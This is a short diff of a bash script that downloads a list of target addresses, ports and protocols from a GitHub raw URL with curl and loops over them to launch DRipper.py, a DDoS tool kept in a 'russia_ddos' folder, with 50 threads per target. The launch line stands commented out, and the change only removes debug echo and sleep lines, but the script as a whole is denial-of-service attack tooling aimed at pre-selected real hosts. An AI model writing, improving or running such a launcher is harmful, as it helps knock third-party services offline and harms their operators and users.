@@ -46,15 +46,11 @@ do
       do
              # Get address, port and protocol from pre-selected targetle
              site=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper_targets | cat)")
-            
-             echo $i
              echo $site
-             sleep 1
                           
              addr=$(echo $site | awk '{print $1}')
              port=$(echo $site | awk '{print $2}')
              prot=$(echo $site | awk '{print $3}')
-             echo $addr $port $prot
 
              # Launch DRipper
              #python3 -u ~/russia_ddos/DRipper.py -l 2048 -s $addr -p $port -m $prot -t 50&
